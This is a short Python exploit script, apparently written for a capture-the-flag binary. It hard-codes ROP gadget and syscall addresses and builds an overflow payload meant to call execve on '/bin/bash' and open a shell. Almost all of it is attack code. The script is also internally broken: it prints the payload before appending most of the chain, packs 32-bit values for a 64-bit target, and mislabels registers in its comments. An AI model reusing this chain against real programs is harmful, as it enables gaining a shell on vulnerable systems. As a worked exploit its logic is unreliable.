import struct
import sys


def p(x):
    return struct.pack('<L', x)

#vmmap
vdso = 0x00007ffff7ffd000
chall = 0x00400000

# Return Address of "A" buffer.
a = 0x7fffffffe164


# Gadgets
pop_rax = 0x0000000000400187
pop_rdi = 0x0000000000400189
pop_rdx = 0x000000000040018d
pop_rsi = 0x000000000040018b
popret 	= 0x40018b
ret 	= 0x40015e
ropjump = 0x400187
chain 	= 0x000000000040017c

# functions
syscall = 0x0000000000400184
write = 0x400149
read = 0x40015f
binsh = 0x400191
ask = 0x400197


# string "/bin/bash"
binbash = 0x7fffffffed94
junk = 0xfffdeadbeef


# empty payload
payload = ""

# padding
payload += "AAAAAAAA"


 # EIP 2 ROP
payload += "\x87\x01\x40\x00\x00\x00\x00\x00"
payload += "\x00" * 8 + "B"	* 6					# syscall execve


sys.stdout.write(payload)
# pop rax = free 1st ARG, syscall "execve" number "\x3b"
# pop rdi = free 2nd ARG, const char *filename
# pop rsi = free 3rd ARG, const char *const argv[], 0x00 NULL BYTE
# pop rdx = free 3rd ARG, const char *const envp[], "0x00" NULL BYTE
# execve("/bin/bash", NULL, NULL");

payload += p(pop_rax)
payload += "\x3b"						# syscall execve
payload += p(pop_rdi)					# pop RDI
payload += "\x94\xed\xff\xff\xff\xf7"	# Argv1 = file addr,"/bin/bash"
payload += p(pop_rsi)					# pop RSI
payload += "\x00"						# Argv2 = NULL
payload += p(pop_rdx)					# pop RDX
payload += "\x00"						# Arg3 = NULL





